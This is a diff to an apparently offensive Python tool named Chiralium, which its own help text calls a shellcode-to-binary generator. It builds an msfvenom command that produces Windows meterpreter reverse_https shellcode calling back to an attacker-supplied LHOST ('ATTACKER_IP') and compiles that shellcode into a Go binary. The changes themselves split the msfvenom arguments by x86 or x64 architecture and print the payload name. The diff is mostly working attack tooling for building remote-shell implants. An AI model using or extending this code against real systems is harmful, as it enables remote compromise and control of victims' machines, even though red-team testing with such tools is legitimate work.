@@ -156,8 +156,10 @@ def msfvenom_generator(platform,arch,shellcodedir,shellcodename,lhost,lport,msfp
 	elif arch == "x64" or arch == "amd64":
 		arch = "x64"
 		payload = "windows/x64/meterpreter/reverse_https"
+
 	cmd = "msfvenom -a {0} --platform {1} -p {2} LHOST={3} LPORT={4} {5} -o {6}/{7}.hex > /dev/null 2>&1".format(arch,platform,payload,lhost,lport,msfparams,shellcodedir,shellcodename)
 	print("[+] Generating the hex shellcode with",colored("msfvenom","green"),". It can take a while, you know, msfvenom...")
+	print("[+] Payload:",colored(payload,"green"))
 	s = os.system(cmd)
 	if not s == 0:
 		cprint("[-] An error occurred with msfvenom ...", "red")
@@ -197,7 +199,8 @@ if __name__ == '__main__':
 	_outputdir = "{0}/{1}".format(_appdir,config['outputdir']) # abspath to output dir
 	_shellcodedir = "{0}/{1}".format(_appdir,config['shellcodedir']) # abspath to shellcode dir
 	_shellcodefile = "{0}/{1}".format(_shellcodedir,config['shellcodefile']) # abspath to default shellcode file
-	_msfvenomargs = config['msfvenomargs']
+	_msfvenomargs86 = config['msfvenomargs86']
+	_msfvenomargs64 = config['msfvenomargs64']
 	_platform = config['platform']
 	
 	safechecks(_appdir)
@@ -205,7 +208,7 @@ if __name__ == '__main__':
 	parser = argparse.ArgumentParser(description="Chiralium : a dirty GO shellcode-to-binary generator.")
 	parser.add_argument('-p', '--platform', type=str, default=_platform, help="Platform for compilation (windows only for the moment)")
 	parser.add_argument('-sc', '--shellcode', type=str, help="File containing HEX shellcode (41414141)")
-	parser.add_argument('-a', '--arch', type=str, default=_arch, help="The architecture to use (x86 or x64)")
+	parser.add_argument('-a', '--arch', type=str, default="x86", help="The architecture to use (x86 or x64)")
 	parser.add_argument('-t', '--test', action='store_true', default=False, help="Test to build a default shellcode that spawn a calc.")
 	parser.add_argument('-msf', '--msfvenom', action='store_true', default=False, help="Generate a meterpreter/reverse_https shellcode with msfvenom")
 	parser.add_argument('-lhost','--lhost', type=str, help="LHOST for msfvenom payload generator ")
@@ -228,14 +231,16 @@ if __name__ == '__main__':
 	if args.arch:
 		if args.arch == "x86" or args.arch == "386":
 			goarch = "386"
+			msfvenomargs = _msfvenomargs86
 		elif args.arch == "x64" or args.arch == "amd64":
 			goarch = "amd64"
+			msfvenomargs = _msfvenomargs64
 		else:
 			goarch = _arch
+			msfvenomargs = _msfvenomargs86
 			print("[+] Can't use arch as",colored("{0}".format(args.arch),"red"),"(x86 or x64 only) ! Using default ...")
 	if not args.arch:
 		goarch = _arch
-	
 	# PLATFORM
 	if args.platform:
 		if args.platform.lower() != "windows":
@@ -258,7 +263,7 @@ if __name__ == '__main__':
 		if not args.lhost:
 			cprint("[-] LHOST is not specify ! Use --lhost ATTACKER_IP. Exiting", "red")
 			sys.exit()
-		msfvenom_generator(_platform, _arch, _shellcodedir, _biname, args.lhost, args.lport,_msfvenomargs)
+		msfvenom_generator(_platform, goarch, _shellcodedir, _biname, args.lhost, args.lport,msfvenomargs)
 		craftbinary("{0}/{1}.hex".format(_shellcodedir,_biname),_outputdir, _biname, _appdir)
 	else:
 		print(args.msfvenom)
